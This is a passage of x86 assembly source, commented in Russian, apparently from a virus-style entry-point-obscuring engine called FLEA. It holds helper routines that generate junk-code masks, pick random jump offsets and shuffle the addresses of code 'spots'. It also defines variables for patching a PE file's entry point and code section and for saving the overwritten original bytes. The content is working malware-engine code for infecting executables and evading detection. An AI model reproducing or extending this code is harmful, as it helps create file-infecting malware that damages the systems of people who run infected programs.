;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи FLEA_RESTSTACK
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx     





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;вспомогательная функция gen_mask 
;генерация маски для мусора 
;ВХОД (stdcall) (gen_mask(DWORD xmask)):
;   xmask - начальная маска 
;ВЫХОД: 
;   EAX - новая маска 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
gen_mask:
    push    ecx
    mov     ecx,dword ptr [esp+08]     
    push    -1 
    call    [ebx].rgen_addr
    and     ecx,eax
    rol     eax,10h 
    push    eax
    call    [ebx].rgen_addr 
    and     ecx,eax   
    xchg    eax,ecx
    pop     ecx
    ret     4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;конец функции gen_mask 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
    




;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;вспомогательная функция get_jmpaddr
;получение операнда для jmp'a, который будет прыгать на следующее пятно 
;ВЫХОД:
;ЕАХ - искомое значение 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_jmpaddr:
    push    max_jmp 
    call    [ebx].rgen_addr
    cmp     eax,min_jmp
    jb      get_jmpaddr  
    ret   
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции get_jmpaddr 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 






;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;вспомогательная функция mix_addr
;перемешивание случайным образом данных в массиве
;заметки: в данном движке используется для перемешивания случаным образом адресов пятен
;ВХОД ( mix_adr(DWORD *addr_mas, DWORD num_elem) ): 
;addr_mas - адрес буфера(массива), где находятся значения, которые следует перемешать
;num_elem - кол-во этих самых элементов
;ВЫХОД:
;перемешанные адреса в буфере(массиве)    
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
mix_addr:
    pushad                  ;
    mov     ecx,dword ptr [esp+28h]             ;ECX - кол-во элементов    
    mov     esi,dword ptr [esp+24h]             ;ESI - адрес буфера, где находятся эти элементы  
    xor     edx,edx 
_nxtmix_: 
    push    ecx
    call    [ebx].rgen_addr                     ;получаем СЧ [0..ECX-1]
    push    dword ptr [esi+edx*4]               ;и перемешиваем     
    push    dword ptr [esi+eax*4]
    pop     dword ptr [esi+edx*4]
    pop     dword ptr [esi+eax*4]
    inc     edx
    cmp     edx,ecx
    jne     _nxtmix_                            ;если перемешали все элементы, то на выход 
            
    popad  
    ret     4*2 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции mix_addr
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

  





;========================================================================================================
;вспомогательные переменные (находятся в стэке) 
;========================================================================================================  
imNTh               equ     dword ptr [ebp-04]  ;указатель на IMAGE_NT_HEADERS 
old_ep              equ     dword ptr [ebp-08]  ;старая точка входа
base                equ     dword ptr [ebp-12]  ;ImageBase 
new_ep              equ     dword ptr [ebp-16]  ;новая точка входа (в конец последней секции) 
start_addr          equ     dword ptr [ebp-20]  ;физический адрес точки входа (+ база мэппинга)  
codesec             equ     dword ptr [ebp-24]  ;указатель на кодовую секцию в табличке секций 
size_codesec        equ     dword ptr [ebp-28]  ;размер в кодовой секции, который реально можно использовать для записи пятен 
max_codesec_addr    equ     dword ptr [ebp-32]  ;максимальный допустимый адрес в кодовой секции, до которого можно записывать пятна 
cur_codesec_addr    equ     dword ptr [ebp-36]  ;текущий адрес в кодовой секции (используется для получения очередного адреса нового пятнышка) 
num_spots           equ     dword ptr [ebp-40]  ;кол-во реально записанных пятен в кодовую секцию 
beg_rest_bytes      equ     dword ptr [ebp-44]  ;адрес буфера, где хранится кол-во записанных пятен, размеры их, адреса, а также оригинальные байты кодовой секции 
cur_rest_bytes      equ     dword ptr [ebp-48]  ;текущий адрес в буфере (вспомогтальная переменная), куда сохраняем оригинальные байты кодовой секции etc 
spot1               equ     dword ptr [ebp-52]  ;размер 1-ой порции мусора (этих первых порций мусора столько, сколько пятен будем записывать) (также вспомогательная переменная) 
spot2               equ     dword ptr [ebp-56]  ;размер 2-ой порции мусора etc 
tgen_struct         equ     dword ptr [ebp-60]  ;адрес структуры TRASHGEN (для трэшгена xTG - или другого тэшгена)     
xtmask1             equ     dword ptr [ebp-64]  ;новая маска1
xtmask2             equ     dword ptr [ebp-68]  ;новая маска2  

restore_bytes       db      MAX_SPOTS*(uportion1+uportion2+7+10)+MAX_SPOTS*(4+4)+101 dup (00h);буфер, представляющий собой следующую структуру:   
                                                ;num_spots              db  1               ;кол-во записанных пятен в кодовой секции 
                                                ;size_spot1             dd  1               ;размер очередного пятна
                                                ;addr_spot1             dd  1               ;адрес очередного пятнышка              
                                                ;save_bytes1            db  size_spot1      ;сохраненные оригинальные байты (вместо которых мы и записали очередное пятно) 
                                                ;size_spot2             dd  1               ;etc 
                                                ;addr_spot2             dd  1
                                                ;save_bytes2            db  size_spot2
                                                ;...
                                                ;size_spot(num_spots)   dd  1
                                                ;addr_spot(num_spots)   dd  1
                                                ;save_bytes(num_spots)  db  size_spot(num_spots) 
   
UEP_RESTBYTES_SIZE  equ     $ - restore_bytes   ;размер буфера, что выше 
;========================================================================================================           

